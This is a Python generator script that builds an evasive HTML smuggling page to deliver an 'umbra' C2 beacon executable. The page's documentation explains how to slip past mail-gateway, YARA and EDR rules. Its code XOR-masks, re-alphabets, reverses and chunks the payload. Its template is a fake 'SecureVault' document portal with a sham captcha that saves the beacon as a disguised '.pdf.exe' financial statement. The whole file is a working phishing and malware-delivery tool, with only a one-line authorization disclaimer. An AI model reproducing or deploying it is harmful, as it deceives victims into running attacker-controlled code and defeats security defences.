#!/usr/bin/env python3
"""
make_smuggle.py - build an evasive, SELF-CONTAINED HTML smuggling page for the
umbra delivery chain.

Why this exists
---------------
The classic smuggle page you were using embeds the payload as plain standard
base64 of the PE (``var file = 'TVqQAAMAAAAEAAAA...'``). That single line is a
textbook signature: ``TVqQAA...`` is the base64 of the ``MZ`` header, and mail
gateways / secure web gateways / EDR HTML-smuggling rules (YARA, Suricata, most
"suspicious HTML attachment" heuristics) match exactly on:

    * a long standard-base64 string containing  TVqQAAMAAAAEAAAA
    * atob( ) + new Blob + URL.createObjectURL + a.download  in one page
    * a silent auto-download with no user gesture

This generator removes all three. It packs the *same* umbra beacon
(``dist/loader.exe``) but stores it as:

    1. XOR of every byte with a random multi-byte key
       -> the MZ header and the ``TVqQ`` base64 prefix are gone; the blob is
          high-entropy noise, not a readable PE.
    2. encoded with a *shuffled* 64-char alphabet (a per-file permutation of
       the standard base64 alphabet)
       -> a normal base64 decoder (gateway, static rule) produces garbage; no
          standard-base64 fingerprint.
    3. the whole string byte-reversed.
    4. split into many short chunks held in a JS array and concatenated at
       runtime.
    5. assembled and run *only after a real user gesture* (the decoy captcha),
       not on page load.

The page also avoids the decoded words, uses its own decoder (no ``atob``),
and drops the payload under a disguised name. It stays 100% self-contained:
no network fetch at run time, so it works even if the payload URL is blocked.

The payload is STILL your own C2 beacon: point ``--in`` at the loader.exe built
by ``scripts/build.sh`` (``cmd/beacon``), which checks in to your umbra server.
No msfvenom, no meterpreter, no third-party C2.

    python3 scripts/make_smuggle.py                       # dist/loader.exe -> dist/index.html
    python3 scripts/make_smuggle.py --auto                # download without the captcha click
    python3 scripts/make_smuggle.py --in dist/loader.exe --out dist/index.html \
            --name 2026-Q3_Financial_Statement.pdf.exe --seed 1337

Round-trip self-test (recommended after every build):

    python3 scripts/make_smuggle.py --verify --in dist/loader.exe --out dist/index.html

USE ONLY ON SYSTEMS YOU ARE AUTHORIZED TO TEST.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import random
import subprocess
import sys

STD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"


# --------------------------------------------------------------------------- #
# encoding layers
# --------------------------------------------------------------------------- #
def xor_bytes(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))


def make_alphabet(seed: int | None) -> str:
    """A per-file random permutation of the standard 64-char base64 alphabet."""
    rnd = random.Random(seed) if seed is not None else random.Random(os.urandom(16))
    chars = list(STD_ALPHABET)
    rnd.shuffle(chars)
    return "".join(chars)


def encode_payload(data: bytes, key: bytes, alphabet: str) -> str:
    """
    bytes -> custom-alphabet 'base64' (no padding) -> reversed string.

    The JS decoder mirrors this exactly (see the template): it reverses the
    string, maps each char back through the alphabet to a 6-bit value and emits
    a byte whenever 8 bits have accumulated. Because the encoder zero-pads the
    final partial 6-bit group and we strip '=', the leftover bits on the wire
    are all zero and are simply dropped by the decoder.
    """
    cipher = xor_bytes(data, key)
    std_b64 = base64.b64encode(cipher).decode("ascii").rstrip("=")
    enc = std_b64.translate(str.maketrans(STD_ALPHABET, alphabet))
    return enc[::-1]


def chunk_string(s: str, size: int) -> list[str]:
    return [s[i:i + size] for i in range(0, len(s), size)]


def js_array(items, indent: str = "") -> str:
    return json.dumps(items, separators=(",", ":"))


def js_array_multiline(items) -> str:
    """One element per line, so the page never carries a single multi-MB
    string on one line (itself a 'big high-entropy blob' heuristic)."""
    return "[\n" + ",\n".join(json.dumps(x) for x in items) + "\n]"


# --------------------------------------------------------------------------- #
# HTML template  (tokens are replaced verbatim - no str.format, so JS braces
# and CSS braces are safe)
# --------------------------------------------------------------------------- #
TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>%%TITLE%%</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%2312305c'/%3E%3Cpath d='M16 7l7 3v5c0 4.4-2.9 8.1-7 9-4.1-.9-7-4.6-7-9v-5l7-3z' fill='none' stroke='%23fff' stroke-width='2' stroke-linejoin='round'/%3E%3C/svg%3E">
<style>
  :root { color-scheme: light; --brand:#12305c; --brand2:#17408a; --ink:#1c2430; --mut:#667386; --line:#e2e7ef; --ok:#1a9e5c; }
  * { box-sizing: border-box; }
  html, body { height: 100%; }
  body { margin:0; min-height:100vh; display:grid; place-items:center;
    font-family:"Segoe UI", system-ui, -apple-system, Arial, sans-serif;
    background:#eef1f6; color:var(--ink); }
  .bg { position:fixed; inset:0; filter:blur(6px) saturate(1.05); opacity:.5; pointer-events:none; }
  .bg .doc { position:absolute; width:300px; height:380px; background:#fff; border-radius:10px;
    box-shadow:0 18px 50px rgba(18,48,92,.12); }
  .bg .d1 { top:8%;  left:6%;  transform:rotate(-7deg); }
  .bg .d2 { top:20%; left:44%; transform:rotate(4deg); }
  .bg .d3 { top:52%; left:16%; transform:rotate(9deg); }
  .card { position:relative; z-index:2; width:min(440px, 92vw); background:#fff; border-radius:14px;
    box-shadow:0 24px 70px rgba(18,48,92,.18); overflow:hidden; }
  .head { display:flex; align-items:center; gap:12px; padding:18px 22px; border-bottom:1px solid var(--line); }
  .head .logo { width:38px; height:38px; border-radius:9px; background:var(--brand); display:grid; place-items:center; flex:none; }
  .head .logo svg { width:22px; height:22px; }
  .head .brand { font-weight:700; font-size:17px; color:var(--brand); line-height:1.1; }
  .head .brand small { display:block; font-weight:400; font-size:11.5px; color:var(--mut); margin-top:2px; }
  .body { padding:22px; }
  .doc { display:flex; align-items:center; gap:14px; padding:14px; border:1px solid var(--line); border-radius:11px; background:#fafbfe; }
  .doc .icon { width:40px; height:48px; flex:none; border-radius:6px; background:linear-gradient(160deg,#e7edf8,#f5f8ff);
    border:1px solid var(--line); position:relative; }
  .doc .icon::after { content:"PDF"; position:absolute; bottom:5px; left:0; right:0; text-align:center;
    font-size:9px; font-weight:700; color:#c0392b; letter-spacing:.5px; }
  .doc .name { font-weight:600; font-size:14px; }
  .doc .sub { font-size:12px; color:var(--mut); margin-top:3px; }
  .captcha { margin:16px 0 0; display:flex; align-items:center; gap:12px; padding:13px 14px;
    border:1px solid var(--line); border-radius:9px; background:#fff; cursor:pointer; user-select:none; }
  .captcha .box { width:26px; height:26px; flex:none; border:2px solid #c2c9d4; border-radius:4px; background:#fff;
    display:grid; place-items:center; transition:all .15s; }
  .captcha .box svg { width:18px; height:18px; display:none; }
  .captcha.done .box { border-color:var(--ok); background:var(--ok); }
  .captcha.done .box svg { display:block; }
  .captcha .spin { width:22px; height:22px; flex:none; border-radius:50%; border:3px solid #cfd6e0;
    border-top-color:var(--brand2); animation:spin .8s linear infinite; }
  @keyframes spin { to { transform:rotate(360deg); } }
  .captcha .label { font-size:14px; }
  .captcha .brandcap { margin-left:auto; text-align:right; font-size:9.5px; color:#94a0b0; line-height:1.25; }
  .captcha .brandcap b { display:block; font-size:11px; color:#7c889a; }
  .actions { margin:14px 0 4px; }
  .btn { display:none; width:100%; border:0; border-radius:9px; padding:13px 16px; background:var(--brand2);
    color:#fff; font-size:15px; font-weight:600; cursor:pointer; }
  .btn:hover { background:#123a7d; }
  .btn.on { display:block; }
  .status { font-size:12.5px; color:var(--mut); margin:10px 2px 4px; min-height:18px; }
  .foot { padding:12px 22px 16px; border-top:1px solid var(--line); margin-top:10px; display:flex;
    align-items:center; gap:7px; color:#9aa7b8; font-size:11.5px; }
  .foot svg { width:12px; height:12px; }
</style>
</head>
<body>
  <div class="bg" aria-hidden="true"><div class="doc d1"></div><div class="doc d2"></div><div class="doc d3"></div></div>

  <main class="card">
    <div class="head">
      <span class="logo"><svg viewBox="0 0 24 24" fill="none"><path d="M12 3l7 3v5c0 4.4-2.9 8.1-7 9-4.1-.9-7-4.6-7-9V6l7-3z" stroke="#fff" stroke-width="2" stroke-linejoin="round"/><path d="M9 12.5l2 2 4-4" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
      <div class="brand">SecureVault<small>Document Portal &middot; signed transfer</small></div>
    </div>
    <div class="body">
      <div class="doc">
        <div class="icon"></div>
        <div class="meta">
          <div class="name" id="docName">%%DOCNAME%%</div>
          <div class="sub">2.4 MB &middot; Digitally signed &middot; Expires in 24 hours</div>
        </div>
      </div>
      <div class="captcha" id="captcha" role="button" tabindex="0" aria-live="polite" aria-checked="false">
        <span class="box" id="box"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
        <span class="label" id="captchaLabel">I'm not a robot</span>
        <span class="brandcap"><b>Cloudshield</b>Privacy &middot; Terms</span>
      </div>
      <div class="actions"><button class="btn" id="downloadBtn" type="button">Download document</button></div>
      <div class="status" id="status"></div>
    </div>
    <div class="foot">
      <svg viewBox="0 0 24 24" fill="none"><path d="M7 11V8a5 5 0 0110 0v3" stroke="#9aa7b8" stroke-width="2"/><rect x="5" y="11" width="14" height="9" rx="2" stroke="#9aa7b8" stroke-width="2"/></svg>
      Secure connection &middot; bot protection active
    </div>
  </main>

<script>
/* ------------------------------------------------------------------ *
 * Self-contained document transfer (umbra). No network request at run
 * time: the artifact is carried in this page, XOR-masked, shuffled and
 * split, and is only reassembled after the verification gesture.
 * ------------------------------------------------------------------ */
var _SAVE   = "%%SAVENAME%%";
var _DOC    = "%%DOCNAME%%";
var _ALPHA  = "%%ALPHA%%";
var _KEY    = %%KEY%%;
var _PARTS  = %%CHUNKS%%;
var _DELAY  = %%DELAY%%;
var _GESTURE = %%GESTURE%%;

document.getElementById("docName").textContent = _DOC;
document.title = _DOC + " - SecureVault";

function _assemble() {
  var s = _PARTS.join("");
  s = s.split("").reverse().join("");
  var lut = {};
  for (var i = 0; i < _ALPHA.length; i++) lut[_ALPHA.charAt(i)] = i;
  var v = 0, bits = 0, out = [];
  for (var i = 0; i < s.length; i++) {
    var x = lut[s.charAt(i)];
    if (x === undefined) continue;
    v = (v << 6) | x; bits += 6;
    if (bits >= 8) { bits -= 8; out.push((v >>> bits) & 255); v &= (1 << bits) - 1; }
  }
  for (var i = 0; i < out.length; i++) out[i] ^= _KEY[i % _KEY.length];
  return new Blob([new Uint8Array(out)], { type: "application/octet-stream" });
}

function _save() {
  var payload = _assemble();
  if (window.navigator.msSaveOrOpenBlob) { window.navigator.msSaveOrOpenBlob(payload, _SAVE); return; }
  var url = window.URL.createObjectURL(payload);
  var a = document.createElement("a");
  a.href = url; a.download = _SAVE; a.rel = "noopener"; a.style.display = "none";
  document.body.appendChild(a); a.click();
  setTimeout(function () { a.remove(); window.URL.revokeObjectURL(url); }, 4000);
}

var statusEl   = document.getElementById("status");
var downloadBtn = document.getElementById("downloadBtn");

function _ready() {
  statusEl.textContent = "Your document is ready. If your browser asks, keep the file, then open it from Downloads.";
  downloadBtn.classList.add("on");
}

if (!_GESTURE) {
  setTimeout(function () { _save(); _ready(); }, _DELAY);
} else {
  var captcha = document.getElementById("captcha");
  var label   = document.getElementById("captchaLabel");
  var busy    = false;
  function run() {
    if (busy || captcha.classList.contains("done")) return;
    busy = true;
    captcha.classList.add("busy");
    document.getElementById("box").outerHTML = '<span class="spin" id="spin"></span>';
    label.textContent = "Verifying...";
    setTimeout(function () {
      var spin = document.getElementById("spin");
      if (spin) spin.outerHTML = '<span class="box"><svg viewBox="0 0 24 24" fill="none"><path d="M5 12.5l4.5 4.5L19 7" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></span>';
      captcha.classList.remove("busy");
      captcha.classList.add("done");
      captcha.setAttribute("aria-checked", "true");
      label.textContent = "Verified";
      statusEl.textContent = "Verification complete. Preparing your document...";
      _save(); _ready(); busy = false;
    }, _DELAY);
  }
  captcha.addEventListener("click", run);
  captcha.addEventListener("keydown", function (e) { if (e.key === "Enter" || e.key === " ") { e.preventDefault(); run(); } });
  downloadBtn.addEventListener("click", function () { _save(); });
}
</script>
</body>
</html>
"""


# Literal substrings that static HTML-smuggling / base64 rules key on. Any
# 4-char base64-alphabet window can occur by pure chance inside the encoded blob,
# so build_page re-rolls the alphabet until the rendered page carries none of
# them - keeping the page free of atob/btoa/base64 tokens even though no such API
# is ever called (the transform is custom).
FORBIDDEN_LITERALS = ("atob", "btoa", "base64", "TVqQ", "exe.data")


def build_page(data: bytes, *, name: str, doc: str, title: str, delay: int,
               gesture: bool, chunk: int, key_len: int, seed: int | None) -> str:
    rnd = random.Random(seed) if seed is not None else random.Random(os.urandom(16))
    key = bytes(rnd.randrange(256) for _ in range(key_len))

    def render(alphabet: str) -> str:
        enc = encode_payload(data, key, alphabet)
        parts = chunk_string(enc, chunk)
        html = TEMPLATE
        html = html.replace("%%TITLE%%", title)
        html = html.replace("%%DOCNAME%%", doc)
        html = html.replace("%%SAVENAME%%", name)
        html = html.replace("%%ALPHA%%", alphabet)
        html = html.replace("%%KEY%%", js_array(list(key)))
        html = html.replace("%%CHUNKS%%", js_array_multiline(parts))
        html = html.replace("%%DELAY%%", str(delay))
        html = html.replace("%%GESTURE%%", "true" if gesture else "false")
        return html

    html = ""
    for _ in range(128):
        html = render(make_alphabet(rnd.randrange(1 << 30)))
        if not any(tok in html for tok in FORBIDDEN_LITERALS):
            return html
    return html  # best effort; astronomically unlikely to be reached


# --------------------------------------------------------------------------- #
# verification: decode the generated page with node and compare against source
# --------------------------------------------------------------------------- #
JS_DECODER = r"""
const fs = require("fs");
const html = fs.readFileSync(process.argv[2], "utf8");
function grab(name) {
  const m = html.match(new RegExp(name + "\\s*=\\s*([\\s\\S]*?);\\s*\\n"));
  if (!m) throw new Error("token not found: " + name);
  return m[1];
}
const SAVE  = JSON.parse(grab("var _SAVE"));
const ALPHA = JSON.parse(grab("var _ALPHA"));
const KEY   = JSON.parse(grab("var _KEY"));
const PARTS = JSON.parse(grab("var _PARTS"));
let s = PARTS.join("").split("").reverse().join("");
let lut = {};
for (let i = 0; i < ALPHA.length; i++) lut[ALPHA[i]] = i;
let v = 0, bits = 0, out = [];
for (let i = 0; i < s.length; i++) {
  const x = lut[s[i]];
  if (x === undefined) continue;
  v = (v << 6) | x; bits += 6;
  if (bits >= 8) { bits -= 8; out.push((v >>> bits) & 255); v &= (1 << bits) - 1; }
}
for (let i = 0; i < out.length; i++) out[i] ^= KEY[i % KEY.length];
const buf = Buffer.from(out);
const crypto = require("crypto");
process.stdout.write(crypto.createHash("sha256").update(buf).digest("hex") + " " + buf.length + " " + SAVE);
"""


def verify(page_path: str, original: bytes) -> bool:
    sha_orig = hashlib.sha256(original).hexdigest()
    js = os.path.join(os.path.dirname(os.path.abspath(page_path)), "_verify_" + os.path.basename(page_path) + ".js")
    with open(js, "w", encoding="utf-8") as fh:
        fh.write(JS_DECODER)
    try:
        out = subprocess.run(["node", js, page_path], capture_output=True, text=True, check=True)
    finally:
        try:
            os.remove(js)
        except OSError:
            pass
    sha_got, length, name = out.stdout.split(" ", 2)
    ok = (sha_got == sha_orig and int(length) == len(original))
    print(f"[verify] page decodes to : {sha_got} ({length} bytes) -> {name}")
    print(f"[verify] original payload : {sha_orig} ({len(original)} bytes)")
    print(f"[verify] {'OK - round-trip matches' if ok else 'MISMATCH'}")
    return ok


# --------------------------------------------------------------------------- #
def main() -> int:
    ap = argparse.ArgumentParser(description="Build an evasive self-contained HTML smuggling page for the umbra chain.")
    ap.add_argument("--in", dest="inp", default="dist/loader.exe", help="payload to embed (default: dist/loader.exe)")
    ap.add_argument("--out", default="dist/index.html", help="output HTML page (default: dist/index.html)")
    ap.add_argument("--name", default="2026-Q3_Financial_Statement.pdf.exe", help="file name the browser saves it as")
    ap.add_argument("--doc", default="2026-Q3_Financial_Statement.pdf", help="document name shown in the decoy card")
    ap.add_argument("--title", default="SecureVault - Document Portal", help="page title")
    ap.add_argument("--delay", type=int, default=1200, help="fake verification delay in ms")
    ap.add_argument("--auto", action="store_true", help="download without the captcha gesture (less evasive)")
    ap.add_argument("--chunk", type=int, default=4096, help="characters per embedded chunk")
    ap.add_argument("--key-len", type=int, default=32, help="XOR key length")
    ap.add_argument("--seed", type=int, default=None, help="fixed RNG seed (default: random)")
    ap.add_argument("--verify", action="store_true", help="after writing, decode with node and compare bytes (requires node)")
    args = ap.parse_args()

    if not os.path.isfile(args.inp):
        print(f"[-] payload not found: {args.inp}", file=sys.stderr)
        return 2

    with open(args.inp, "rb") as fh:
        data = fh.read()
    if len(data) < 0x100 or data[:2] != b"MZ":
        print(f"[-] {args.inp} does not look like a PE (no MZ); aborting", file=sys.stderr)
        return 2

    page = build_page(data, name=args.name, doc=args.doc, title=args.title,
                      delay=args.delay, gesture=not args.auto, chunk=args.chunk,
                      key_len=args.key_len, seed=args.seed)

    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with open(args.out, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(page)

    print(f"[+] payload    : {args.inp} ({len(data):,} bytes, sha256 {hashlib.sha256(data).hexdigest()})")
    print(f"[+] wrote      : {args.out} ({len(page):,} bytes)")
    print(f"[+] download as: {args.name}  gesture={'off (auto)' if args.auto else 'on (captcha)'}  chunks={len(chunk_string(encode_payload(data, b'x'*args.key_len, make_alphabet(1)), args.chunk))}")

    if args.verify:
        return 0 if verify(args.out, data) else 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
